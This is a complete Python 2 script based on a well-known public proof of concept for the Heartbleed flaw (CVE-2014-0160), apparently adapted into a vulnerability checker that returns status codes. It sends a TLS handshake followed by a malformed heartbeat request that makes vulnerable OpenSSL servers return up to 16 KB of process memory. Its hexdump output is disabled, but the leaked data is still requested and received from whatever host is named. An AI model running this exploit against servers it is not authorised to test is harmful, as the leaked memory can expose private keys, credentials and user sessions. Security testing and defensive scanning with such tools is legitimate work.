#!/usr/bin/python

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.
#
# Minor changes to return all messages rather than print them by Jonathan Dieter (jdieter@lesbg.com)
# The author disclaims copyright to this source code.

import struct
import socket
import time
import select
import re

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

hb = h2bin('''
18 03 02 00 03
01 40 00
''')

def hexdump(s):
    return ""
    vrb = ""
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        vrb += '  %04x: %-48s %s\n' % (b, hxdat, pdat)
    vrb += '\n'
    return vrb

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata


def recvmsg(s):
    vrb = ""
    hdr = recvall(s, 5)
    if hdr is None:
        vrb += 'Unexpected EOF receiving record header - server closed connection\n'
        return None, None, None, vrb
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        vrb += 'Unexpected EOF receiving record payload - server closed connection\n'
        return None, None, None, vrb
    vrb += ' ... received message: type = %d, ver = %04x, length = %d\n' % (typ, ver, len(pay))
    return typ, ver, pay, vrb

def hit_hb(server, port):
    vrb = ""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    vrb += 'Connecting...\n'
    #sys.stdout.flush()
    try:
        s.connect((server, port))
    except:
        return (2, "Unable to connect", vrb)
    vrb += 'Sending Client Hello...\n'
    #sys.stdout.flush()
    s.send(hello)
    vrb += 'Waiting for Server Hello...\n'
    #sys.stdout.flush()
    while True:
        typ, ver, pay, new_vrb = recvmsg(s)
        vrb += new_vrb
        if typ == None:
            return (2, 'Server closed connection without sending Server Hello.', vrb)
        # Look for server hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            break

    vrb += 'Sending heartbeat request...\n'
    #sys.stdout.flush()
    s.send(hb)

    s.send(hb)
    while True:
        typ, ver, pay, new_vrb = recvmsg(s)
        vrb += new_vrb
        if typ is None:
            return (0, 'No heartbeat response received, server likely not vulnerable', vrb)

        if typ == 24:
            vrb += 'Received heartbeat response:\n'
            vrb += hexdump(pay)
            if len(pay) > 3:
                return (1, 'WARNING: server returned more data than it should - this server is vulnerable!', vrb)
            else:
                return (0, 'Server processed malformed heartbeat, but did not return any extra data.', vrb)

        if typ == 21:
            vrb += 'Received alert:\n'
            vrb += hexdump(pay)
            return (0, 'Server returned error, likely not vulnerable', vrb)

def main():
    import sys
    from optparse import OptionParser

    options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
    options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')

    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return 3

    (retval, msg, verbose) = hit_hb(args[0], opts.port)
    print >> sys.stderr, verbose,
    print msg
    return retval

if __name__ == '__main__':
    import sys
    sys.exit(main())
